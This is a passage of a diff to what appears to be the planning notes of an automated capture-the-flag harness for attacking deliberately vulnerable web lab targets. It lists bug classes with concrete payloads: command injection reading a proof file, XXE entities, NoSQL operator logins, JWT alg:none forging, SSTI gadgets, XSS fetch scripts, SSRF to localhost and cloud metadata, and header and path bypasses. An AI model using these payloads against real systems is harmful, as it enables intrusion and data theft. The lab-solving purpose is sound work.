D04 | `?doc=`/`?page=`/`?file=` with filename value, \"directory\", \"boundary\", \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |","-| 5 | missing function-level authz (unlinked route) | seen D05 | \"staff-only\", \"sign, no lock\", \"bouncer\", `/api/clues` `feature_route`, `current_role` | GET the clue route | done; Mastery |","-| 6 | role / privilege via client-controlled header, query or cookie | gap (D05 solver tries X-Role / `?role=admin` / `role=admin` cookie) | `current_role` in clues, `role=` cookie, `X-User-Role` mention | flip the value the app names | high: D05 sequel \"now there is a lock\" |","-| 7 | JWT tampering (`alg:none`, weak/leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization`, \"token\", \"signature\" | decode; resign with `none` or the leaked secret | high |","-| 8 | signed-cookie / session forgery (Flask `itsdangerous`, Express `s:`, base64 JSON cookie) | gap | `session=eyJ...` dot parts, `s%3A` prefix, base64 JSON cookie | decode; re-sign if the secret leaks (backup, .env, clues) | high |","-| 9 | mass assignment / over-posting | gap | JSON profile update, `is_admin`/`role` in GET but not in the form | add `role:\"admin\"` / `is_admin:true` to PUT/POST | high |","-| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\", \"convert\", tool output in page | `;cat /run/huntress/objective.txt`, `|`, `$()`, backticks, `%0a` | high |","-| 11 | SSTI (Jinja2 / Twig / ERB / EJS / Handlebars) | gap | \"template\", \"preview\", \"greeting card\", `{{7*7}}` -> 49 | engine probe then file-read gadget | high |","-| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\", \"import from URL\", \"internal\" | `http://127.0.0.1:<port>/...`, `file:///run/...`, the internal host the app names | high |","-| 13 | XSS (reflected / stored / DOM) | gap | \"comment\", \"guestbook\", \"report to admin\", reflected param in HTML | reflected marker, then `<script>` / handler; app may return `effect` JSON or need a bot | med-high (proof needs a bot or server-side check) |","-| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS / README | use the leaked pair; vendor default only (no brute force) | med-high |","-| 15 | auth bypass by header trust (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`, `X-Forwarded-Host`) | gap | \"internal only\", \"localhost only\", 403 with IP in message | spoof the header the error names | med-high |","-| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `X-HTTP-Method-Override`, `_method=` | HEAD/POST/PUT/OPTIONS + overrides | med |","-| 17 | path-normalisation authz bypass (`/admin/..;/`, `//admin`, `%2e`, case, trailing `.`/`/`) | gap | 403 on a named route, proxy in front (`Server:`/`Via:`) | normalisation variants of the blocked path | med |","-| 18 | XXE | gap | XML upload/import, `Content-Type: application/xml`, SOAP, SVG/DOCX upload | external entity `file:///run/huntress/objective.txt` | med |","-| 19 | NoSQL injection (Mongo operators) | gap | JSON login, \"MongoDB\", `username[$ne]=` | `{\"$ne\": null}`, `$regex`, `$gt:\"\"` | med |","-| 20 | file upload -> webshell / served file | gap | upload form, \"avatar\", \"attachments\", files served back | upload a script/template the server executes or a path-traversal filename | med |","-| 21 | insecure deserialization (pickle / PHP `O:` / node-serialize / Java `rO0`) | gap | base64 cookie starting `gASV`/`Tzo`/`rO0`/`{\"rce\"` | craft a gadget that reads the proof file | med-low |","-| 22 | exposed VCS / env / debug (`/.git/`, `/.env`, Werkzeug/Django DEBUG, actuator, phpinfo) | gap | `X-Powered-By`, DEBUG 404 page listing routes, `/.git/HEAD` 200 | fetch the leak, reconstruct `.git` objects | med (D01 cousin) |","-| 23 | GraphQL introspection / hidden field | gap | `/graphql`, `{\"data\":` | `__schema` query, then the hidden field | med |","-| 24 | open redirect / CORS / CSRF | gap | `?next=`, `Access-Control-Allow-Origin` reflecting | prove with the app's `effect` response | low (hard to prove with a static proof) |","-| 25 | prototype pollution (Node) | gap | JSON merge endpoint, \"settings\", Node banner | `{\"__proto__\":{\"isAdmin\":true}}` | med-low |","-| 26 | race condition / business logic (negative qty, coupon reuse, price tamper) | gap | shop / wallet / voucher | parallel requests, negative/overflow values in the app's own form | med-low |","-| 27 | password-reset / predictable token / OTP | gap | \"forgot password\", token in response, sequential/time-based token | read the token the app leaks; no brute force | med-low |","-| 28 | UNION / error / blind SQLi | gap (D03 needed only a tautology) | numeric id param, DB errors shown | `ORDER BY` count, `UNION SELECT`, boolean diff | med (SQLi sequel) |","-| 29 | LFI filters (`../` stripped, suffix appended, prefix required, encoding) | partial (D04 solver tries `....//`, `..%2f`, `php://filter`, prefixed) | traversal returns \"not allowed\" / `.php` appended | double encoding, `%00`, `....//`, `pages/../../`, wrappers | med (TT/Mastery sequel) |","-| 30 | HTTP request smuggling / cache poisoning / host-header | gap | proxy + cache headers, password-reset links using Host | `X-Forwarded-Host`, CL/TE | low |","-| 31 | static web evidence (HAR, pcap, access logs, web shell, minified JS) | gap (never released; skill covers it) | `.har`, pcap magic, combined-log lines, `eval(gzinflate(base64_decode(` | jq / tshark / decode layers | low (the lane is live-target so far) |","+| 1 | exposed backup / forced browsing via robots | seen D01 (Mastery x2) | robots `Disallow: /<word>-<hex>/`, \"crawler policy\", \"archive\" | robots -> index -> every link (depth 2) | done; Mastery |","+| 2 | IDOR (object-level authz) | seen D02 (compound) | \"Signed in as\", `/<things>/<id>`, `fetch('/api/<things>/'+id)` | foreign ids from `/api/history` | done; Mastery |","+| 3 | SQL injection (tautology) | seen D03 | search form, \"database\", \"one pointed question\" | `zz') OR 1=1 --` family | done; Mastery |","+| 4 | path traversal / LFI | seen D04 (compound x2) | `?doc=`/`?page=` filename value, \"mounted at /path\" | `../`*10 + prompt path | done; Mastery |","+| 5 | missing function-level authz (unlinked route) | seen D05 (D08 Mastery) | \"staff-only, just a sign\", clue `feature_route` | GET the clue route | done; Mastery |","+| 6 | role / privilege via client-controlled header, query or cookie | gap | `current_role: analyst` in every clue JSON, `role=` cookie | flip the value the app names | high |","+| 7 | JWT tampering (`alg:none`, leaked HS256 secret, kid/jku) | gap | 3 base64url parts in cookie / `Authorization` | decode; resign with `none` / leaked secret | high (session family after D08) |","+| 8 | signed-cookie / session forgery (Flask, Express `s:`, base64 JSON) | gap | `session=eyJ...`, `s%3A`, base64 JSON cookie | decode; re-sign with a leaked secret | high |","+| 9 | mass assignment / over-posting | gap | JSON profile update, `is_admin`/`role` in GET only | add `role:\"admin\"` to PUT/POST | high |","+| 10 | OS command injection | gap | \"ping\", \"lookup host\", \"diagnostics\" | `;cat /run/huntress/objective.txt`, `|`, `$()`, `%0a` | high |","+| 11 | SSTI | gap | \"template\", \"preview\", \"greeting\", `{{7*7}}`->49 | engine probe then file read | high |","+| 12 | SSRF | gap | \"fetch URL\", \"preview link\", \"webhook\" | `http://127.0.0.1/<clue route>`, `file:///run/...` | high |","+| 13a | reflected XSS (server-judged callback) | seen D06 | \"repeats everything\", \"talks back\", clue `callback_nonce` | reflect `<script>fetch(cb?nonce)`, then GET cb with Sec-Fetch-* + Referer | done; Mastery |","+| 13b | stored XSS (moderator bot) | seen D07 | \"guestbook\", \"reviewer stops by\", `moderator_data_route`, `receipt_route_template` | store fetch(data)->POST receipt script; poll entry | done; Mastery |","+| 13c | DOM XSS (`location.hash`/`search` -> `innerHTML`/`eval`) | gap | inline JS reading location, \"client-side\", \"nothing reaches the server\" | scan sinks; bot visits `#payload` URL or callback check | high (XSS trilogy) |","+| 14 | default / leaked credentials login | gap | login form, creds in comment / backup / JS | use the leaked pair (no brute force) | med-high |","+| 15 | header-trust bypass (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`) | gap | \"internal only\", \"localhost only\" | spoof the header the error names | med-high |","+| 16 | HTTP verb / method-override tampering | gap | 405/403 on GET, `_method=` | other methods + overrides | med |","+| 17 | path-normalisation authz bypass | gap | 403 on a named route | `/ADMIN`, `//admin`, `/admin;/`, `%2e` | med |","+| 18 | XXE | gap | XML/SVG/DOCX upload, `application/xml` | entity on `file:///run/huntress/objective.txt` | med |","+| 19 | NoSQL injection | gap | JSON login, \"MongoDB\" | `{\"$ne\":null}` | med |","+| 20 | file upload -> execution / traversal | gap | upload form, files served back | executable type or `../` filename | med |","+| 21 | insecure deserialization | gap | cookie `gASV`/`Tzo`/`rO0`/`_$$ND_FUNC$$_` | tamper fields, then gadget | med-low |","+| 22 | exposed VCS / env / debug | gap | `/.git/HEAD` 200, `/.env`, DEBUG page | fetch, reconstruct, read secret | med |","+| 23 | GraphQL introspection / hidden field | gap | `/graphql`, `{\"data\":` | `__schema`, hidden fields | med |","+| 24a | CSRF (bot victim performs a state change) | gap | \"the admin clicks links\", \"change email\", no token / SameSite=None, report-to-admin | host an auto-submitting form / fetch in stored content or a bot-visited URL | high (bot proven D07; session family D08) |","+| 24b | open redirect (incl. OAuth `redirect_uri`) | gap | `?next=`/`?return=`/`redirect_uri`, \"after login\" | redirect to a clue route / `//host`; effect JSON | med-high |","+| 24c | CORS misconfig (reflected Origin + credentials) | gap | `Access-Control-Allow-Origin` echoing Origin, `-Credentials: true` | request with `Origin: null` / attacker; bot reads data | med |","+| 24d | clickjacking / framing | gap | no X-Frame-Options/CSP frame-ancestors, \"one click\" | effect likely judged server-side by headers | low |","+| 25 | prototype pollution (Node) | gap | JSON merge \"settings\", Node banner | `{\"__proto__\":{\"isAdmin\":true}}` | med-low |","+| 26 | race condition / business logic | gap | shop / wallet / voucher, \"only once\" | parallel burst, negative values | med-low |","+| 27 | password-reset / predictable token / OTP | gap | \"forgot password\", token in response | read the leaked token; no brute force | med |","+| 28 | UNION / error / blind SQLi | gap | numeric id, DB errors | `ORDER BY`, `UNION SELECT`, boolean diff | med |","+| 29 | LFI filters | partial (D04 payload set) | \"not allowed\", `.php` appended | `....//`, double-encode, `pages/../`, wrappers | med |","+| 30 | request smuggling / cache poisoning / host header | gap | proxy + cache headers, reset links using Host | `X-Forwarded-Host`, CL/TE | low |","+| 31 | session fixation (planted id adopted by victim login) | seen D08 | \"plant your session\", \"welcome mat\", clue `session_hint`, 400 `session_id_required` | `?sid=<hint>` on feature route -> cookie `arena_session=<hint>` on secondary | done; Mastery |","+| 32 | session hijack / weak session ids / logout not invalidating | gap | sequential or timestamp ids, ids leaked in URLs/logs/Referer | reuse a leaked id the app shows | med (D08 sequel) |","+| 33 | static web evidence (HAR, pcap, logs, web shell) | gap (never released) | `.har`, pcap magic, combined-log lines | jq / tshark / decode layers | low |"," "," ## Recognition cues (worker quick-reference)"," "," ```","-FIRST 60 SECONDS ON ANY TARGET (all cheap, do them in parallel, curl --max-time 20 -A 'Mozilla/5.0'):","-  GET /            -> links, forms, inline JS fetch('/api/..'), HTML comments, \"Signed in as\", pills, footer banner","-  GET /robots.txt  -> Disallow paths (D01): fetch each, then EVERY link on what it returns (depth 2)","-  GET /sitemap.xml, /api/clues, /api, /api/history  -> app-narrated routes / roles / ids (D02, D05)","-  regex  proof_[0-9a-f]{32}  over EVERY body (JSON-decode, base64-decode, unzip first). JSON `evidence` = answer.","-  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = target not ready, re-poll hctf status.","-MASTERY: 2 targets, prompt describes only today's bug -> run every concept probe on every target.","+FIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):","+  GET /api/clues   -> feature_route / secondary_route / current_role + ONE concept key (see table below)","+  GET each clue route BARE: the JSON error names the missing piece (session_id_required, authenticated_login_required,","+      browser_callback_required, 401/403 = needs the victim's/admin's session)","+  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow","+  regex  proof_[0-9a-f]{32}  over EVERY body (JSON/base64/zip decoded). JSON `evidence` = answer.","+  410 {\"state\":\"completed\"} = attempt already solved; `preparing` = not ready, re-poll hctf status.","+Pick routes by clue KEY (feature_/secondary_/*_data_route/*_template) and openapi paths, NEVER by the word in the","+value (callback|internal|status, messages|postcards are re-dealt per variant).","+MASTERY: 2-3 targets, prompt = today's bug only -> recon each target, run the hinted probe first, the rest staged."," ","-PROMPT / PAGE CUE                                     -> BUG                -> FIRST REQUEST","-\"backup\", \"diary\", \"archive\", \"forgot to clean up\"     -> exposed backup     -> robots Disallow -> index -> .bak/.zip","-\"neighbor's records\", \"somebody else's row\", ids       -> IDOR               -> foreign id from feed into the API template","-search box, \"database\", \"one pointed question\"         -> SQLi               -> q=zz') OR 1=1 --   (+ ' \" )) # variants)","-\"stay inside its directory\", ?doc=/?page=/?file=      -> traversal/LFI      -> ?doc=../../../../../../../../../../run/huntress/objective.txt","-\"staff-only door, no lock, just a sign\", current_role  -> unprotected route  -> GET /api/clues feature_route","-current_role / role cookie / X-*-Role mention          -> role tampering     -> set the named value to admin","-eyJ...eyJ...sig in cookie/Authorization               -> JWT                -> alg none / leaked secret, role claim","-\"ping\", \"host lookup\", \"diagnostics\", \"convert\"       -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)","-\"template\", \"preview\", \"greeting\", {{7*7}}=49          -> SSTI               -> engine probe -> file read","-\"fetch URL\", \"preview link\", \"webhook\", \"import\"      -> SSRF               -> http://127.0.0.1/<named path>, file:///run/...","-\"profile\", JSON PUT, is_admin in GET only              -> mass assignment    -> add role/is_admin to the body","-\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Real-IP, X-Original-URL)","-XML/SVG/DOCX upload, application/xml                   -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">","-JSON login, Mongo                                     -> NoSQLi             -> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}","-\"comment\", \"guestbook\", \"report to admin\"              -> XSS                -> reflected marker first; look for an `effect` reply","-upload form, files served back                         -> upload             -> server-executed type or ../ filename","-/.git/HEAD 200, /.env, DEBUG page                      -> VCS/debug leak     -> fetch, reconstruct, read secret -> forge","-The prompt names an absolute path (/run/huntress/objective.txt): ANY file-read primitive should aim there.","-Banners (\"Django\", \"Node.js\", \".php\") are costume; the title pun names the bug.","+CLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST","+robots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)","+\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template","+search box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --   (+ ' \" )) # variants)","+?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt","+feature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it","+callback_nonce, \"repeats everything\", \"talks back\"     -> reflected XSS      -> feature?q=<script>fetch('/cb?nonce=N')</script>, then","+      GET /cb?nonce=N with Sec-Fetch-Site: same-origin, Sec-Fetch-Mode: cors, Sec-Fetch-Dest: empty,","+      Referer: <reflected URL>, Origin: <base>, X-Callback-Nonce: N   -> effect isolated_browser_callback","+moderator_data_route + receipt_route_template,         -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>..fetch(DATA,","+  \"guestbook\", \"reviewer stops by\"                          {credentials:'include'}) -> POST RCPT(id from location.pathname)","+                                                            {evidence}</script>\"}; poll /<noun>/{id} and / for >=30 s","+session_hint, \"plant your session\", \"welcome mat\"      -> session fixation   -> feature?sid=<hint> (sets arena_session=<hint>),","+                                                            then secondary with Cookie: arena_session=<hint>","+current_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin","+eyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim","+\"admin clicks links\", \"change email\", report-to-admin  -> CSRF               -> stored/bot-visited auto-submit form to the state route","+location.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check","+?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host","+\"ping\", \"host lookup\", \"diagnostics\"                  -> command injection  -> ;cat /run/huntress/objective.txt  (| $() ` %0a)","+\"template\", \"preview\", {{7*7}}=49                      -> SSTI               -> engine probe -> file read","+\"fetch URL\", \"webhook\", \"import\"                      -> SSRF               -> http://127.0.0.1/<clue route>, file:///run/...","+\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)","+XML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">","+A real victim browser exists (D07): anything \"the admin/reviewer/moderator visits\" can run your JS with their cookies;","+receipts can land >12 s later. \"Browser required\" errors without a bot (D06) = send fetch-metadata headers yourself.","+Banners (\"Django\", \"Laravel\", \"Node.js\", \".php\") are costume; the title pun names the bug."," ```"," "," ## Readiness gaps"," ","-Priority 1 = plausible within ~3 calendar days (at 2-3 lane-days per day that is ~6-9 new bugs). \"prebuild\" = pure","-python in a future `lib/web.py` (request planner + response parser, no I/O; the solver fetches) with offline","-fixtures = recorded bodies incl. a decoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (no","-`web:*` keys in `.run/prebuild-state.json`).","+Priority 1 = plausible within ~3 calendar days (~9 lane-days at the current pace). \"prebuild\" = pure python in a","+future `lib/web.py` (request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded","+bodies incl. a decoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (no web prebuild lane)."," "," ```json"," [","-  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"hctf/prebuild.py LANES has no `web` entry, so none of the prebuild gaps below can drain. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web.py, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web.py:plan,)}` plus a minimal lib/web.py with `plan(pages) -> [requests]` and `find_proof(body) -> str|None`. Fixtures = saved target responses (the targets 410 after CORRECT, so record them during the single solve).\"},","-  {\"id\": \"recon-crawl-depth2\", \"concept\": \"shared recon planner: robots/sitemap/comments/clue JSON/links, depth 2 (rows 1, 5, 22)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"The D04 Mastery miss. Pure function: given fetched bodies keyed by path, return the next same-origin GETs: robots Allow/Disallow paths, sitemap <loc>, href/src/action, fetch('/..') and axios/XHR literals in inline JS, HTML-comment paths, every string value starting with '/' in JSON (clues, history, config), plus links on any fetched directory index (depth 2), capped ~40 requests, skipping /assets and static images. Parser: proof_[0-9a-f]{32} over bodies after JSON / base64 / zip / gzip decoding. Fixtures: D01-style robots -> index -> .json.bak (proof one link deeper), D05-style /api/clues -> feature_route, decoy release-notes.txt.\"},","-  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target (Mastery mixes days)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Registry in lib/web.py: concept -> (cheap detector over the recon pages, request planner). Order by detector hits, not prompt keywords: backup crawl, clue routes, IDOR feed ids, LFI params, SQLi forms, then role tampering, command injection, SSTI, SSRF. The per-day solve.py calls `dispatch(pages)` instead of importing earlier days' solvers one by one (D05 did that via fallback()). Fixture: a two-target recorded pair where target 1 is D01-style and the prompt is an LFI prompt.\"},","-  {\"id\": \"role-tamper-planner\", \"concept\": \"client-controlled role: header / query / cookie / JSON body / JWT claim (rows 6, 9)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D05 had current_role: analyst and a route that needed nothing; the sequel likely enforces a role the client controls. From recon: the role field name and value the app shows (current_role, role, is_admin, group, tier), cookies set by the app, headers named in clues/errors. Plan: cookie role=<admin|staff|owner|the higher value the app lists>, base64-JSON cookie rewrite, X-Role / X-User-Role / X-Forwarded-User, ?role=, JSON body role/is_admin on PUT/POST/PATCH to the profile endpoint. Parser: `effect` + `evidence` JSON or proof regex.\"},","-  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Pure python (hmac, hashlib, base64, json, zlib): decode JWT header/claims; produce alg none (+ 'None'/'NONE', empty sig), HS256 re-signed with secrets FOUND in recon (backup files, .env, clue JSON, JS bundles, comments), RS256->HS256 with a published public key (jwks.json, /.well-known). Flask session: base64url(zlib?) payload . timestamp . sig with itsdangerous key derivation (salt 'cookie-session', HMAC-SHA1 derive) re-signed with a leaked secret. Escalate role/admin/sub claims. No secret brute force beyond secrets the app itself leaks.\"},","-  {\"id\": \"cmd-injection-planner\", \"concept\": \"OS command injection to read the mounted proof (row 10)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For each form/param the detector flags (host, ip, target, domain, filename, cmd): payloads with separators ; | || && %0a $() backticks, with/without a valid prefix value (127.0.0.1), reading the prompt-named path (default /run/huntress/objective.txt) via cat, also `$(cat ...)` echoed into output and `${IFS}` space bypass. Parser: proof regex in the response or in the reflected tool output block.\"},","-  {\"id\": \"ssti-engine-probe\", \"concept\": \"server-side template injection (row 11)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Probe each reflected text field with arithmetic markers ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{7*'7'}} -> 7777777 means Jinja2) and map the result to the engine; then a file-read payload per engine for the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / get_flashed_messages.__globals__ / lipsum.__globals__, Twig _self.env / source(), ERB File.read, EJS/Handlebars/Nunjucks constructor chains, Freemarker ?new(). Also try reading app config (config.items(), SECRET_KEY) to feed jwt-session-forge.\"},","-  {\"id\": \"ssrf-planner\", \"concept\": \"server-side request forgery (row 12)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Detect URL-taking params/forms (url, link, src, webhook, feed, image, callback). Plan: file:///run/huntress/objective.txt, http://127.0.0.1 / localhost / 0.0.0.0 / [::1] / 2130706433 / 127.1 on the target's own and named internal ports and paths (from clues/comments: /internal, /admin, /metadata), http://169.254.169.254/latest/meta-data/ only if the app names it, redirect-scheme and @-userinfo bypasses for an allowlist. Parser: proof regex in the fetched-preview body.\"},","-  {\"id\": \"header-trust-verb-path-bypass\", \"concept\": \"IP/header trust, method override, path normalisation (rows 15-17)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"For a route that 401/403/405s: X-Forwarded-For / X-Real-IP / X-Client-IP / True-Client-IP / Forwarded: for=127.0.0.1; X-Original-URL / X-Rewrite-URL with the blocked path; methods HEAD/POST/PUT/PATCH/OPTIONS and X-HTTP-Method-Override / _method; path variants /ADMIN, /admin/, /admin/., //admin, /./admin, /admin;/, /%61dmin, /admin..;/, /admin%2f, trailing ?/#. Stop at the first 200 carrying proof or effect JSON.\"},","-  {\"id\": \"xss-effect-probe\", \"concept\": \"reflected / stored / DOM XSS proven by the app (row 13)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Reflect a unique marker in every param/form; classify the sink context (HTML text, attribute, JS string, URL) from the response; build a context-correct payload (<script>, \\\"><img src=x onerror=...>, '-alert(1)-', javascript:). The GM likely checks server-side (as D05 returned effect JSON) or via a report-to-admin bot endpoint: submit the payload URL there and poll the page/API for proof. Static DOM-XSS: scan inline JS for location.hash/search -> innerHTML/eval sinks.\"},","-  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"For XML endpoints/uploads (application/xml, SOAP, SVG, DOCX/XLSX word/document.xml): classic in-band entity on the prompt path, parameter-entity variant, php://filter base64 for PHP, XInclude when the DOCTYPE is not controllable, and an SVG / DOCX container builder (zipfile) carrying the entity. Parser: proof regex, base64 decode.\"},","-  {\"id\": \"nosql-operator-injection\", \"concept\": \"MongoDB-style operator injection (row 19)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"JSON login/search bodies: {\\\"$ne\\\":null}, {\\\"$gt\\\":\\\"\\\"}, {\\\"$regex\\\":\\\".*\\\"}, {\\\"$exists\\\":true}; form-encoded username[$ne]=x; `$where` only when the app is Mongo-flavoured. Pick the field names from the form/JS. Parser: proof regex or a role/admin page reached with the returned session.\"},","-  {\"id\": \"upload-execution-planner\", \"concept\": \"file upload to execution or traversal (row 20)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"From an upload form: allowed-extension probing (double extension shell.php.jpg, .phtml/.php5, case, trailing dot, null byte), content-type/magic spoof (GIF89a prefix), filename traversal (../../), SVG with script/XXE, template files (.html/.ejs) if the app renders uploads. Payload only reads the prompt-named proof path. Parser: locate the stored URL in the response, fetch it, proof regex.\"},","-  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D01 cousin. Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /server-status, /debug, /actuator/env, /phpinfo.php ONLY when recon names them or as part of the capped recon list. Pure parser: .git objects (zlib) -> commits -> trees -> blobs (rebuild a file from loose objects; packfile index for refs), .DS_Store filename list, Django DEBUG 404 URL-pattern list -> new routes, .env KEY=VALUE secrets -> jwt-session-forge.\"},","-  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Sequel to D03. ORDER BY / NULL-count column discovery, UNION SELECT with the proof-table guess taken from error messages or sqlite_master / information_schema, string-column detection by marker; boolean-blind extraction with a diff oracle over the response length (bounded: one char at a time over [0-9a-f_proof], 32-char cap). Login-form bypass `admin'--`. SQLite/MySQL/Postgres comment and concat dialects.\"},","-  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"If /graphql or a `{\\\"data\\\":` response appears: standard introspection query, list every type/field, then query hidden fields (proof, secret, flag, note, evidence) and node(id) lookups for foreign objects (IDOR over GraphQL). Field suggestions ('Did you mean') when introspection is off.\"},","-  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Extend D04's payload set into a planner: nested strip (....//, ..././), URL / double URL / overlong UTF-8 encoding of dot and slash, backslash, required prefix (keep the original dir: pages/../../..), appended suffix (.php/.html -> %00, ?, #, path truncation, php://filter), absolute path, file:// scheme, /proc/self/cwd and /proc/self/root prefixes. Order cheapest-first; parser decodes base64 filter output.\"},","-  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies starting gASV/gAN (pickle), Tzo/YTo (PHP O:/a:), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Build minimal gadgets that read the proof path (pickle os.popen reduce; PHP property tampering of an isAdmin/role field before any RCE). Prefer data tampering over code execution.\"},","-  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Planner for numeric fields (negative, zero, huge, float, overflow), coupon/redeem replay, parallel burst plan (~20 requests) for a single-use action, and reset-token prediction from tokens the app itself leaks (timestamp, md5(email), sequential). No credential guessing.\"},","-  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT and the saved contract may be the `preparing` body, so solver-test cannot replay singles (D02/D03 HELP). Harness: log every target request/response the solver or worker makes during the single into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; this is also the fixture source for the web prebuild.\"},","-  {\"id\": \"headless-browser\", \"concept\": \"DOM / XSS needing a JS engine (row 13)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"Only if an XSS day needs client-side execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or use the system chromium --headless --dump-dom). Most days are provable server-side; don't install before a day needs it.\"}","+  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: web is not a prebuild lane\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Still true after D08: hctf/prebuild.py LANES has no `web` entry and lib/web.py does not exist, so none of the prebuild gaps below can drain. Owner of hctf/: add `web: {brief: prebuild_web, writable: (lib/web.py, tests/data/web_fixtures/), targets: tests/data/web_fixtures/TARGETS.json, gate: (tests/test_lane_fixtures.py,), regress_lane: web, requires: (lib/web.py:plan,)}` plus a minimal lib/web.py with `plan(pages) -> [requests]` and `find_proof(body) -> str|None`. Fixtures = saved target responses (targets 410 after CORRECT).\"},","+  {\"id\": \"clue-json-router\", \"concept\": \"map /api/clues keys + JSON error codes to the concept and the next request (rows 5, 13a, 13b, 31)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Every target since D05 serves /api/clues {framework, feature_route, secondary_route, current_role, <concept key>}. Pure function: clues JSON (+ bare-route error bodies) -> concept + request plan. Known keys: session_hint (D08 fixation: GET feature?sid=<hint>, then secondary with Cookie arena_session=<hint>; also try session_id/session/PHPSESSID names), callback_nonce (D06: reflect <script>fetch(secondary?nonce=N)</script> via ?q= on feature, then GET secondary?nonce=N with Sec-Fetch-Site same-origin / Mode cors / Dest empty, Referer reflected URL, Origin, X-Callback-Nonce), moderator_data_route + receipt_route_template (D07 stored XSS payload builder with id from location.pathname), feature_route alone (D05 GET/POST). Known errors: session_id_required, authenticated_login_required, browser_callback_required, not_found. Select routes by KEY, never by the word in the value (callback|internal|status re-dealt). Unknown key -> return it as a hint for the worker. Fixtures: D05/D06/D08 clue bodies from the day-20/21 worker logs.\"},","+  {\"id\": \"mastery-concept-dispatcher\", \"concept\": \"run every known lane concept on every target without recursion or starvation\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D08 Mastery (3 targets) took ~15 min: racing every earlier solver on every target slowed the app 5 s -> 13 s, and day-21 solvers' fallback() imported each other (infinite recursion). Registry in lib/web.py: concept -> (detector over 